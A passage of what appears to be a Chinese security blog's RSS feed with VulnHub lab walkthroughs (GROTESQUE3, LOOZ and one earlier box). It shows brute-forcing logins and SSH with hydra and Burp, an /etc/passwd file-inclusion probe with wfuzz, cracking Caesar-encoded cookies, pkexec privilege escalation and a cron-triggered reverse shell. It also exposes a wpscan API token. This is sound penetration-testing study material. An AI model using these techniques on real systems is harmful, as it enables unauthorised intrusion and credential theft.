&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-992.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;给出了 guest:guest 的账户和密码，直接进入该网站&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-993.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看了一下，翻了翻源代码没有发现敏感信息&lt;/p&gt;
&lt;p&gt;用 gobuster 进行爆破:&lt;br&gt;
 &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.12:8080/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-994.png&#34;&gt;
&lt;p&gt;-&amp;gt; 关键目录 /admin&lt;/p&gt;
&lt;h3 id=&#34;存储-cookies-泄露&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#存储-cookies-泄露&#34;&gt;#&lt;/a&gt; 存储 cookies 泄露&lt;/h3&gt;
&lt;p&gt;进入 admin 页面，检查页面是否存储 cookies 信息&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-995.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将 auth 认证信息解密出来后发现是 guest:thrfg&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-996.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;意味着我们登陆 guest 用户，页面就会存储 guest 用户的相关票据，但是凭借此用户密码是无法登陆到网站后台的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-997.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;是不是有可能还有其他的登陆用户，我们将 google 存储在此页面的 cookie 信息清除&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-998.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;重新回到登陆页面&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-999.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 下一步的目标转化为爆破此页面的用户名和密码&lt;/p&gt;
&lt;h3 id=&#34;burp-爆破登陆框&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#burp-爆破登陆框&#34;&gt;#&lt;/a&gt; burp 爆破登陆框&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;但是如果没有什么规律的话， 1000 行大小的字典爆破，需要 1000*1000 次的爆破次数，因为用户名和密码都有可能是这 1000 个种的任意一个&lt;br&gt;
输入一个错误的用户名看页面回显，看到了 Invalid username 的信息，于是乎我们可以先随便写一个密码，先爆破出用户名有哪些，有的话在依据此用户名爆破其密码&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1000.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;顺便测一下输入正确的用户名，错误的密码的时候，页面的回显结果。发现有 Invalid password 的字段，可以据此信息判断页面是否能登陆成功。&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1001.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;现在我们就通过爆破用户名的方式进入该网站，可以通过 burp 和 hydra 进行爆破。采用 burp 的方式需要先将浏览器数据进行代理。&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1002.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将用户名设置为变量，密码设置为固定值进行爆破，由于默认给出的账户名和密码都是 guest 是一样的，这里我就直接通过将 username 和 password 的字段设置为一致来爆破。&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1003.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;选取合适的字典如下，开始爆破&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1004.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;爆破成功后得到了 venus 用户是该网站的用户。&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1005.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;接下来应该将 venus 作为固定用户名，测试其密码为多少。&lt;/p&gt;
&lt;h3 id=&#34;hydra-爆破登陆框&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra-爆破登陆框&#34;&gt;#&lt;/a&gt; hydra 爆破登陆框&lt;/h3&gt;
&lt;p&gt;或者用 hydra 的方式爆破用户名和密码&lt;br&gt;
 &lt;code&gt;hydra -L /usr/share/wordlists/rockyou.txt -p pass -s 8080 192.168.31.12 http-post- form &amp;quot;/:username=^USER^&amp;amp;password^PASS^:Invalid username.&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1006.png&#34;&gt;
&lt;p&gt;-&amp;gt; 测试得到了三个用户分别是 guest，venus，magellan&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;爆破用户名的阶段是比较漫长的，虽然可以用 hydra 的 - t 参数指定最大线程为 64 ，但是还是需要很长时间才能爆破出三个用户名的，这里为了尽快达到效果，我用了 vim 将字典进行了修改。&lt;br&gt;
单单依据上面的思路继续下去，需要对三个用户分别进行爆破，guest 和 venus 比较好爆破，经过一段时间的爆破发现这两个用户名的密码就是其用户名。但如果这个密码是比较复杂的也是很难爆破出来的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;数据包规律&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#数据包规律&#34;&gt;#&lt;/a&gt; 数据包规律&lt;/h3&gt;
&lt;p&gt;登陆 guest:guest，拦截浏览器数据，发现页面自动存储了 cookie 的信息。解密之后为 guest:thrfg, 前者是用户名，后者并不是密码，但可能是密码的另一种加密方式。&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1007.png&#34;&gt;
&lt;p&gt;登陆 venus:venus，拦截浏览器数据，找到 cookie，解密后的凭据为 venus:irahf&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1008.png&#34;&gt;
&lt;p&gt;我们继续清除浏览器存储的 cookie 信息，用正确的用户名和一个虚假的密码尝试登陆，并用 burp 做代理拦截流量，发现页面给我们回复了一个加密密文。解密后得到了 magellan:irahfvnatrbybtl1989&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1009.png&#34;&gt;
&lt;p&gt;综上，我们得到了三组数据，分别是&lt;/p&gt;
&lt;p&gt;&lt;code&gt;guest:thrfg&lt;/code&gt;   &lt;code&gt;venus:irahf&lt;/code&gt;   &lt;code&gt;magellan:irahfvnatrbybtl1989&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;凯撒解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#凯撒解密&#34;&gt;#&lt;/a&gt; 凯撒解密&lt;/h3&gt;
&lt;p&gt;观察得知，好像就是一个字符的偏移加密，这就是凯撒加密无疑了，但是具体偏移多少位还需要一一尝试，在下面网址中依次按不同的偏移量进行解密:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL21vZXJzaW1hLjAwY2hhLm5ldC9rYWlzYW1pbWEuYXNw&#34;&gt;http://moersima.00cha.net/kaisamima.asp&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1010.png&#34; width=&#34;390&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;最终得到了加密方式为凯撒偏移 13 的加密，并且三位用户名密码均得到了。&lt;/p&gt;
&lt;p&gt;ssh 成功拿到了 magellan 的权限，得到了其 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1011.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;pkexec-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pkexec-提权&#34;&gt;#&lt;/a&gt; pkexec 提权&lt;/h3&gt;
&lt;p&gt;看了一眼服务器存在 pkexec 的，并且有 s 权限，而且存在 gcc 编译器的，直接利用此进行提权&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1012.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将 pkexec 的利用脚本发送至对方服务器，编译运行&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1013.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到了 root 权限&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/133%20GROTESQUE3/</guid>
            <title>VULNHUB 33 GROTESQUE3</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/133%20GROTESQUE3/</link>
            <category>VULNHUB 31-40</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZ3JvdGVzcXVlLTMwMSw3MjMv&#34;&gt;https://www.vulnhub.com/entry/grotesque-301,723/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 GROTESQUE3：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l &amp;gt; 1.txt ; cat 1.txt | grep &#39;a0&#39; ; rm -f 1.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-866.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.63&lt;/p&gt;
&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -p- 192.168.31.63&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-867.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 22,80&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTAyLw==&#34;&gt;http://192.168.31.102/&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-868.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;这里有一个地址，点击这个地址会跳转到一个页面&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNjMvYXRsYXNnLmpwZw==&#34;&gt;http://192.168.31.63/atlasg.jpg&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-869.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提示指向了这个图片，看来这个图片有一些线索，仔细查看这个图片&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-870.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;图片中的一部分有这么一张小图片，有 MD 还有 5 个 X，很显然是 md5&lt;br&gt;
 那么这个 md5 加密有什么可以利用的地方吗？可能会是目录采用的 md5 加密，可能是某个特殊的文件地址的前缀是 md5 的字符串&lt;/p&gt;
&lt;h3 id=&#34;linux-下-md5-加密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#linux-下-md5-加密&#34;&gt;#&lt;/a&gt; linux 下 md5 加密&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;终端里边进行 md5 加密和解密分别为如下操作&lt;br&gt;
 echo “xxx” | md5sum&lt;br&gt;
John 1.txt –format=Raw-MD5 –wordlist=/usr/share/wordlists/dirbuster/directory –fork =2&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-871.png&#34; width=&#34;600&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;抓取网站的数据包，通过 burp 代理浏览器数据&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-872.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;设置攻击类型为 Cluster bomb，即两个字段采用两个不同的字典，第一个字段填一个比较常用的爆破字典&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-873.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;第二个字典填一个经常用的后缀，如下&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-874.png&#34; width=&#34;360&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;并且采用 md5 加密对自己的 payload 进行加密&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-875.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;注意要对第一个字段 md5 加密，第二个字段不加密，按此方法爆破即可&lt;/p&gt;
&lt;p&gt;还有另外一种爆破方式，是通过 linux 命令生成批量的 md5 加密的字典&lt;br&gt;
 &lt;code&gt;for i in $(cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt); do echo $i;echo $i | md5sum &amp;gt;&amp;gt; dirscroty_md5.txt; done&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-876.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;生成的字典显示如下，每一行的最后面都有一个横线&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-877.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;利用vim自定义txt&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用vim自定义txt&#34;&gt;#&lt;/a&gt; 利用 vim 自定义 txt&lt;/h3&gt;
&lt;p&gt;输入:% s#-##g 即可以批量清除横线&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-878.png&#34; width=&#34;270&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;此时的字典已经显示为正常，可用此 md5 加密字典进行爆破&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-879.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;爆破-md5-目录&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#爆破-md5-目录&#34;&gt;#&lt;/a&gt; 爆破 md5 目录&lt;/h3&gt;
&lt;p&gt;用 gobuster 加载此字典进行目录的搜集&lt;br&gt;
 &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,bak,php.bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium-md5.txt -u http://192.168.31.63/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-880.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到了一个敏感的地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjQyL2Y2NmIyMmJmMDIwMzM0YjA0YzdkMGQzZWI1MDEwMzkxLnBocA==&#34;&gt;http://192.168.31.242/f66b22bf020334b04c7d0d3eb5010391.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-881.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看来是有一些参数在这个 url 地址后边&lt;/p&gt;
&lt;h3 id=&#34;wfuzz爆破http参数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wfuzz爆破http参数&#34;&gt;#&lt;/a&gt; wfuzz 爆破 http 参数&lt;/h3&gt;
&lt;p&gt;用 wfuzz 爆破 http 参数&lt;br&gt;
 &lt;code&gt;wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u &amp;quot;http://192.168.31.63/f66b22bf020334b04c7d0d3eb5010391.php?FUZZ=/etc/passwd&amp;quot; -c --hh 0 -t 32 --hc 404,403&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-882.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到了一个 pupose 时返回 200 的代码，打开目录&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNjMvZjY2YjIyYmYwMjAzMzRiMDRjN2QwZDNlYjUwMTAzOTEucGhwP3B1cnBvc2U9L2V0Yy9wYXNzd2Q=&#34;&gt;http://192.168.31.63/f66b22bf020334b04c7d0d3eb5010391.php?purpose=/etc/passwd&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-883.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现了敏感文件泄漏，检查源代码可以看到格式比较标准的文件，&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-884.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 发现存在 freddie 和 root 两个用户&lt;/p&gt;
&lt;h3 id=&#34;hydra-爆破-ssh&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra-爆破-ssh&#34;&gt;#&lt;/a&gt; hydra 爆破 ssh&lt;/h3&gt;
&lt;p&gt;目前只能收集到上述一个用户名的信息，密码没有，尝试 hydra 爆破，由于之前采用的是 md5 加密的目录才搜索到的网址，这里对正常的字典扫描了，一遍之后并没有发现，于是猜测用 md5 加密字典对 ssh 密码扫描&lt;/p&gt;
&lt;p&gt;&lt;code&gt;hydra -l freddie -P g3.txt ssh://192.168.31.63 -f -t 32 -I -o hydra.ssh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 扫描到用户 freddie 的密码是 61a4e3e60c063d1e472dd780f64e6cad&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-885.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;ssh &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOmZyZWRkaWVAMTkyLjE2OC4zMS42Mw==&#34;&gt;freddie@192.168.31.63&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-886.png&#34; width=&#34;530&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;上传shellsh到smb&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#上传shellsh到smb&#34;&gt;#&lt;/a&gt; 上传 shell.sh 到 smb&lt;/h3&gt;
&lt;p&gt;看到有一个 445 端口正在执行，445 是 smb 协议&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-887.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看看共享文件夹中的内容  &lt;code&gt;smbclient -N -L 127.0.0.1&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-888.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;其中带 $ 的是管理员才能进入的目录，发现可直接访问的 grotesque 目录&lt;/p&gt;
&lt;p&gt;连接到共享文件夹中  &lt;code&gt;smbclient \\\\127.0.0.1\\grotesque&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-889.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;没有什么敏感文件，给服务器下载一个 pyps64s 进行监控，看会不会执行 smb 中的文件&lt;/p&gt;
&lt;p&gt;发现每隔一段时间会执行 smb 中的可执行文件，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1zaGVsbC1mZzFoeWp5OHdzc3Iuc2g=&#34;&gt; 准备一个 shell.sh&lt;/span&gt;，尝试上传到 smb 中&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-890.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将 shell.sh 中的内容复制，粘贴到靶机上边，将靶机上的 shell.sh 中的内容上传到 smb 服务中&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-891.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;监听 shell，等待反弹，pspy 监控到执行，同时得到了 root 的 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-892.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 拿到了 root 的权限&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/140%20LOOZ/</guid>
            <title>VULNHUB 40 LOOZ</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/140%20LOOZ/</link>
            <category>VULNHUB 31-40</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvbG9vei0xLDczMi8=&#34;&gt;https://www.vulnhub.com/entry/looz-1,732/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9uZXBjb2RleC5jb20vMjAyMS8wOC93YWxrdGhyb3VnaC1vZi1sb296LWZyb20tdnVsbmh1Yi13cml0ZXVwLw==&#34;&gt;https://nepcodex.com/2021/08/walkthrough-of-looz-from-vulnhub-writeup/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 LOOZ：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
由已至内网靶机所在主机 MAC 地址自动扫描靶机服务&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | xargs sudo nmap -PA&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1096.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.80 靶机开放端口 22,80,139,445,3306,8081&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODA=&#34;&gt;http://192.168.31.80&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1097.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;审查源代码，找到一则提示信息，展示了一个用户名和密码  &lt;code&gt;john:y0uC@n&#39;tbr3akIT&lt;/code&gt;  并且告知了此网站是 wp 的，即是 wordpres 站点&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1098.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;既然是 wordpress 站点，我就直接用 wpscan 工具来扫描一波&lt;br&gt;
 &lt;code&gt;wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://192.168.31.80 -e&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1099.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;居然说是没有 wp，那可能是误导我们或者 wp 站点在其他的目录里。对网站进行 gobuster 扫描，识别一下网站有什么目录没有&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1100.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现没有，按照 wp 的规范，后台地址是 wp-admin, 我们直接进该目录，发现这个站点确实不存在 wp，可能在其他的目录或者站点里边&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1101.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;还有一个 8081 的站点也是网站，点进来看看有没有啥敏感信息，发现进到这个页面之后会跳转&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1102.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;跳转到了一个站点，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS13d3ctcTMzZXI4b2YyenMxcThza2Vwai5sb296LmNvbQ==&#34;&gt;站点的域名是 www.looz.com&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1103.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;修改本地的 hosts 文件，将站点 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5sb296LmNvbQ==&#34;&gt;www.looz.com&lt;/span&gt; 的 DNS 解析指向靶机 ip&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1104.png&#34; width=&#34;350&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;尝试一下一直寻找的 wp 站点是不是就在这个 url 地址上，直接在域名后面拼接一个 wp-admin 找后台登陆地址&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1105.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到后台地址后凭借我们在前面收集到的用户信息登陆&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1106.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;wordpress-渗透测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wordpress-渗透测试&#34;&gt;#&lt;/a&gt; wordpress 渗透测试&lt;/h3&gt;
&lt;p&gt;一眼看到网站是 wordpress 6.0.1 的，直接用本地的 searchsploit 寻找是否存在此版本的 wordpress 的漏洞&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1107.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;这个版本没有很明显的提权漏洞，只能另想其他方法了，既然是 wp 站点，索性在继续用 wpsan 扫描，枚举用户名&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1108.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;wpscan 扫描出了以下几个用户名 john,william,james,evelyn,mason,harper,gandalf&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1109.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;继续用 wpsan 枚举属于这几个用户名的密码&lt;br&gt;
 &lt;code&gt;wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://wp.looz.com/ -U john,william,james,evelyn,mason,harper,gandalf - P /usr/share/wordlists/rockyou.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1110.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;最终得到了用户 gandalf 的密码 loveme2,&lt;/p&gt;
&lt;h3 id=&#34;wp_admin_shell_upload-使用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wp_admin_shell_upload-使用&#34;&gt;#&lt;/a&gt; wp_admin_shell_upload 使用&lt;/h3&gt;
&lt;p&gt;目前得到了 wp 站点的两组账号，在 msf 中有一个 wp_admin_shell_upload 的模块，可根据已有账号反弹 shell，用这两个模块尝试反弹 shell&lt;/p&gt;
